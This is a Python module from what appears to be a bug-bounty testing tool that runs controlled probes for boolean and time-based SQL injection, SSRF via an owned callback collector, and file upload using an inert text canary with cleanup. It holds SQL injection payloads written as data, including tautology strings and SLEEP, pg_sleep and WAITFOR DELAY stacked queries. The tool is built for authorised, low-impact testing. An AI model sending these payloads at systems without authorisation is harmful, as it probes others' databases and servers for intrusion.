"""Controlled canary differentials; no data extraction or executable uploads."""
import hashlib
import secrets
from urllib.parse import urlencode

from .bounty import _decode_json


def execute(case, runner):
    kind = case["kind"]
    receipts, signals = [], []
    actor, url = case["actor"], case["url"]
    if kind in {"sqli-boolean", "sqli-timing"}:
        if kind == "sqli-boolean":
            baseline = "-2147483647" if case["context"] == "numeric" else "hq_missing"
            true, false = {"single-quoted": ("hq_missing' OR 'hq'='hq' -- ", "hq_missing' AND 'hq'='no' -- "),
                "double-quoted": ('hq_missing" OR "hq"="hq" -- ', 'hq_missing" AND "hq"="no" -- '),
                "numeric": ("-2147483647 OR 317=317", "-2147483647 AND 317=318")}[case["context"]]
        else:
            baseline = "hq_missing"
            true, false = {"mysql": ("hq_missing' OR SLEEP(1) -- ", "hq_missing' OR SLEEP(0) -- "),
                "postgresql": ("hq_missing'; SELECT pg_sleep(1); -- ", "hq_missing'; SELECT pg_sleep(0); -- "),
                "mssql": ("hq_missing'; WAITFOR DELAY '00:00:01'; -- ", "hq_missing'; WAITFOR DELAY '00:00:00'; -- ")}[case["dialect"]]
        for name, value in zip(("baseline", "probe", "negative", "probe-repeat", "baseline-repeat"), (baseline, true, false, true, baseline)):
            response, receipt = runner.request(url, actor, query={case["parameter"]: value})
            receipt["case"] = name
            receipts.append(receipt)
            if receipt["status"] != 200:
                return {"state": "inconclusive", "receipts": receipts}
            if kind == "sqli-boolean":
                signals.append(case["canary_marker"].encode() in response["body"])
        if kind == "sqli-boolean":
            matched = signals == [False, True, False, True, False]
            controls = not any(signals[i] for i in (0, 2, 4))
            stable = signals[1] == signals[3]
            state = "matched" if matched else "not_observed" if controls and stable else "inconclusive"
            for row, signal in zip(receipts, signals):
                row["canary_observed"] = signal
        else:
            controls = [receipts[i]["elapsed_ms"] for i in (0, 2, 4)]
            probes = [receipts[i]["elapsed_ms"] for i in (1, 3)]
            stable = max(controls) - min(controls) <= 250 and abs(probes[0] - probes[1]) <= 350
            matched = stable and min(probes) - max(controls) >= 750
            state = "timing_signal" if matched else "not_observed" if stable and max(probes) - min(controls) < 250 else "inconclusive"
        return {"state": state, "receipts": receipts, "repeat_consistent": stable,
            "evidence_level": "owned-public-canary-differential" if kind == "sqli-boolean" else "latency-differential-not-sql-proof",
            "customer_vulnerability_confirmed": False}
    if kind == "ssrf-callback":
        token = secrets.token_hex(16)

        def observed():
            response, receipt = runner.request(case["read_url"], case["collector_actor"], query={"token": token})
            receipts.append(receipt)
            data = _decode_json(response["body"])
            if (receipt["status"] != 200 or not isinstance(data, dict) or set(data) != {"token", "observed"}
                    or data["token"] != token or type(data["observed"]) is not bool):
                raise ValueError("Invalid owned callback witness")
            return data["observed"]

        baseline = observed()
        if baseline:
            return {"state": "inconclusive", "receipts": receipts}
        callback = case["receive_url"] + "?" + urlencode({"token": token})
        response, receipt = runner.request(url, actor, query={case["parameter"]: callback})
        receipts.append(receipt)
        if response["status"] != 200:
            return {"state": "inconclusive", "receipts": receipts}
        signal = observed()
        return {"state": "matched" if signal else "not_observed", "receipts": receipts,
            "evidence_level": "fresh-owned-callback-witness", "customer_vulnerability_confirmed": False}
    if kind == "upload-canary":
        token = secrets.token_hex(16)
        payload = ("HUNTERQA_UPLOAD_CANARY_" + token).encode()
        resource = case["resource_url"].replace("{canary}", token)
        boundary = "HunterQA" + token
        multipart = ("--" + boundary + '\r\nContent-Disposition: form-data; name="file"; filename="hunterqa-' + token
            + '.txt"\r\nContent-Type: text/plain\r\n\r\n').encode() + payload + ("\r\n--" + boundary + "--\r\n").encode()
        result = {"state": "inconclusive", "receipts": receipts, "canary_id": token, "cleanup_verified": False,
            "evidence_level": "inert-text-upload-roundtrip", "customer_vulnerability_confirmed": False}
        attempted = False
        try:
            baseline, receipt = runner.request(resource, actor)
            receipts.append(receipt)
            if baseline["status"] != 404:
                return result
            attempted = True
            uploaded, receipt = runner.request(url, actor, "POST", body=multipart, headers={"Content-Type": "multipart/form-data; boundary=" + boundary})
            receipts.append(receipt)
            if uploaded["status"] != 201:
                return result
            fetched, receipt = runner.request(resource, actor)
            receipts.append(receipt)
            result["state"] = "matched" if fetched["status"] == 200 and fetched["body"] == payload else "different"
            result["canary_sha256"] = hashlib.sha256(payload).hexdigest()
        except Exception as error:
            result["error_type"] = type(error).__name__
            runner.stopped = True
        finally:
            if attempted and not runner.stopped:
                try:
                    cleaned, receipt = runner.request(case["cleanup_url"], actor, "POST", form={"canary": token})
                    receipts.append(receipt)
                    remaining, receipt = runner.request(resource, actor)
                    receipts.append(receipt)
                    result["cleanup_verified"] = cleaned["status"] in {200, 204} and remaining["status"] == 404
                except Exception as error:
                    result["error_type"] = type(error).__name__
                    runner.stopped = True
            if not result["cleanup_verified"]:
                result["state"] = "inconclusive"
        return result
    raise ValueError("Unknown controlled probe")
